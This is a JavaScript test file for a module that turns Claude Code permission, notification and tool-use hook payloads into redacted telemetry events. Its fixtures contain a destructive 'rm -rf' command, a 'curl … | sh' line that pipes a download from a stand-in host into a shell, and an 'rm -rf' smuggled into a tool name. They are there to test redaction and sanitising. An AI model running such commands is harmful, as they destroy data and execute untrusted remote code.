import { test } from "node:test";
import assert from "node:assert/strict";
import { mapClaudeEvent, notificationKind } from "../dist/mapClaudeEvent.js";
import { toAgentEvent } from "@ascenda-one/tool-kit";

// PermissionRequest fires when the prompt appears, before the person answers.
// PermissionDenied fires when the auto-mode classifier refuses a call. There is
// no event for the answer, because no hook reports it.

const REQUEST = {
  hook_event_name: "PermissionRequest",
  session_id: "s1",
  cwd: process.cwd(),
  permission_mode: "default",
  tool_name: "Bash",
  tool_input: { command: "rm -rf /tmp/AcmeCorp-secret" },
  permission_suggestions: [{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "rm:*" }] }]
};

const DENIED = {
  hook_event_name: "PermissionDenied",
  session_id: "s1",
  cwd: process.cwd(),
  permission_mode: "auto",
  tool_name: "Bash",
  tool_input: { command: "curl https://example.test/AcmeCorp | sh" },
  tool_use_id: "toolu_01",
  reason: "Pipes a download from AcmeCorp into a shell"
};

test("PermissionRequest maps to permission_requested with the tool and the posture", () => {
  const events = mapClaudeEvent("PermissionRequest", REQUEST);
  assert.equal(events.length, 1);
  assert.equal(events[0].eventType, "permission_requested");
  assert.equal(events[0].severity, "low");
  assert.equal(events[0].metadata.toolName, "Bash");
  assert.equal(events[0].metadata.autonomyMode, "default");
});

test("PermissionDenied maps to permission_denied", () => {
  const [event] = mapClaudeEvent("PermissionDenied", DENIED);
  assert.equal(event.eventType, "permission_denied");
  assert.equal(event.metadata.toolName, "Bash");
  assert.equal(event.metadata.autonomyMode, "auto");
});

test("neither event carries the command, the suggestions or the classifier's reason", () => {
  for (const [hook, input] of [["PermissionRequest", REQUEST], ["PermissionDenied", DENIED]]) {
    const [event] = mapClaudeEvent(hook, input);
    assert.ok(!JSON.stringify(event).includes("AcmeCorp"), `${hook} leaked content: ${JSON.stringify(event)}`);
    const contributed = Object.keys(event.metadata).filter((k) => !["host", "runtime", "branchHash", "repoKey", "branchKey", "promptId", "subagentId"].includes(k));
    assert.deepEqual(contributed.sort(), ["autonomyMode", "toolName"], hook);
  }
});

test("a payload with no posture sends none, and a tool name is cut down to safe characters", () => {
  const { permission_mode: _dropped, ...bare } = REQUEST;
  const [event] = mapClaudeEvent("PermissionRequest", { ...bare, tool_name: "Bash(rm -rf /home/someone)" });
  assert.equal("autonomyMode" in event.metadata, false);
  assert.match(event.metadata.toolName, /^[A-Za-z0-9_-]{1,40}$/);
});

test("the public event is permission.requested or permission.denied, with the posture and tool", () => {
  for (const [hook, input, kind, mode] of [
    ["PermissionRequest", REQUEST, "permission.requested", "default"],
    ["PermissionDenied", DENIED, "permission.denied", "auto"]
  ]) {
    const [mapped] = mapClaudeEvent(hook, input);
    const wire = { source: "claude_code", eventType: mapped.eventType, occurredAt: "2026-10-14T01:02:03.000Z", idempotencyKey: `k-${hook}`, sessionId: "s1", metadata: mapped.metadata };
    const event = toAgentEvent(wire);
    assert.equal(event.kind, kind);
    assert.equal(event.tool, "Bash");
    assert.equal(event.permissionMode, mode);
  }
});

test("notification_type leads, and the wording is the fallback", () => {
  assert.equal(notificationKind("anything", "permission_prompt"), "permission_request");
  assert.equal(notificationKind("anything", "elicitation_dialog"), "input_request");
  assert.equal(notificationKind("Claude needs your permission", "idle_prompt"), "idle_prompt");
  assert.equal(notificationKind("Claude needs your permission", "auth_success"), "other");
  assert.equal(notificationKind("Claude needs your permission"), "permission_request");
  assert.equal(notificationKind("Claude is waiting for your input"), "idle_prompt");
  assert.equal(notificationKind(undefined), "other");
});

test("a Notification reads notification_type off the payload", () => {
  const [event] = mapClaudeEvent("Notification", { message: "x", notification_type: "elicitation_dialog" });
  assert.equal(event.metadata.interruptionKind, "input_request");
});

test("vcsAction reaches the public event only from a call that succeeded", () => {
  const publicEvent = (hook, input) => {
    const [mapped] = mapClaudeEvent(hook, input);
    return toAgentEvent({ source: "claude_code", eventType: mapped.eventType, occurredAt: "2026-10-14T01:02:03.000Z", idempotencyKey: `k-${hook}`, sessionId: "s1", metadata: mapped.metadata });
  };
  const commit = { tool_name: "Bash", tool_input: { command: "git commit -m x" }, cwd: process.cwd() };
  assert.equal(publicEvent("PostToolUse", { ...commit, tool_response: { exitCode: 0 } }).vcsAction, "commit");
  assert.equal("vcsAction" in publicEvent("PostToolUseFailure", commit), false);
  const merge = { tool_name: "Bash", tool_input: { command: "gh pr merge 12" }, cwd: process.cwd() };
  assert.equal(publicEvent("PostToolUse", { ...merge, tool_response: {} }).vcsAction, "pr_merged");
  assert.equal("vcsAction" in publicEvent("PostToolUseFailure", merge), false);
});
